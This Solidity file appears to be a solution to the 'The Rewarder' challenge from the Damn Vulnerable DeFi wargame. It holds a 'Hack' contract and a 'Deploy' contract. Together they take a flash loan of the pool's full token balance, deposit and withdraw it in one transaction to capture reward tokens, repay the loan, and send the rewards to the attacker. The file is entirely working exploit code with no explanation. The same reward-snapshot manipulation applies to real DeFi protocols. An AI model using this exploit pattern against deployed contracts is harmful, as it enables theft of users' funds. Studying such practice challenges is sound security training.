// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "./RewardToken.sol";



contract Hack {
    address public rewarder;
    address public token;
    address public loaner;

    constructor(address _rewarder, address _token, address _loaner){
        rewarder = _rewarder;
        token = _token;
        loaner = _loaner;
    }

    function run() public {
        uint256 amount = DamnValuableToken(token).balanceOf(loaner);
        FlashLoanerPool(loaner).flashLoan(amount);
    }

    function receiveFlashLoan(uint256 _amount) public {
        DamnValuableToken(token).approve(rewarder, _amount);
        TheRewarderPool(rewarder).deposit(_amount); 
        TheRewarderPool(rewarder).withdraw(_amount); 
        DamnValuableToken(token).transfer(loaner, _amount);
    }

    function withdrawRewards(address _attacker, address _rewtoken) public {
        uint256 amount = RewardToken(_rewtoken).balanceOf(address(this));
        RewardToken(_rewtoken).transfer(_attacker, amount);
    }

}

contract Deploy {

    constructor(address _rewarder, address _token, address _loaner, address _rewtoken){
        Hack h = new Hack(_rewarder, _token, _loaner);
        h.run();
        h.withdrawRewards(msg.sender, _rewtoken);
    }
}
